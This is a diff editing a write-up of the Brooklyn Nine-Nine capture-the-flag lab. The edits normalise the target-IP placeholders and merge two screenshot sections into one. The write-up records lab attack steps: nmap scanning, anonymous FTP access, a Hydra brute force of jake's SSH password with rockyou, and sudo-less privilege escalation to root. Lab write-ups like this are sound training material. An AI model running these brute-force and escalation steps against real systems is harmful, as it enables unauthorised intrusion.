@@ -20,7 +20,7 @@ Gain initial access to the target machine and escalate privileges to obtain both
 I started by performing a service and version scan using Nmap.
 
 ```bash
-nmap -sC -sV <TARGET_IP>
+nmap -sC -sV TARGET_IP
 ```
 
 ### Screenshot: Nmap Scan
@@ -44,7 +44,7 @@ The scan revealed three exposed services: FTP, SSH, and HTTP. Since FTP was acce
 I connected to the FTP service using anonymous authentication.
 
 ```bash
-ftp <TARGET_IP>
+ftp TARGET_IP
 ```
 
 ```text
@@ -72,7 +72,7 @@ The contents of the note suggested that Jake was using a weak password.
 Using the username identified from the note, I performed a password attack against SSH using Hydra and the RockYou wordlist.
 
 ```bash
-hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>
+hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP
 ```
 
 ### Screenshot: Hydra Password Discovery
@@ -88,7 +88,7 @@ Hydra successfully identified valid SSH credentials.
 Using the recovered credentials, I connected to the target via SSH.
 
 ```bash
-ssh jake@<TARGET_IP>
+ssh jake@TARGET_IP
 ```
 
 After gaining access, I searched for the user flag.
@@ -113,10 +113,6 @@ The first privilege escalation step was checking the user's sudo permissions.
 ```bash
 sudo -l
 ```
-
-### Screenshot: Sudo Permissions
-
-![sudo -l Output](screenshots/sudo_permissions.png)
 
 The output showed that the user could execute `less` as root without requiring a password.
 
@@ -146,9 +142,9 @@ whoami
 root
 ```
 
-### Screenshot: Root Shell
+### Screenshot: Sudo Permissions and Root Shell
 
-![Root Shell](screenshots/root_shell.png)
+![Sudo Permissions and Root Shell](screenshots/sudo_root_shell.png)
 
 Root access was successfully obtained.
 
@@ -213,7 +209,6 @@ brooklyn-nine-nine/
     ├── ftp_enumeration.png
     ├── hydra_success.png
     ├── ssh_user_flag.png
-    ├── sudo_permissions.png
-    ├── root_shell.png
+    ├── sudo_root_shell.png
     └── root_flag.png
 ```
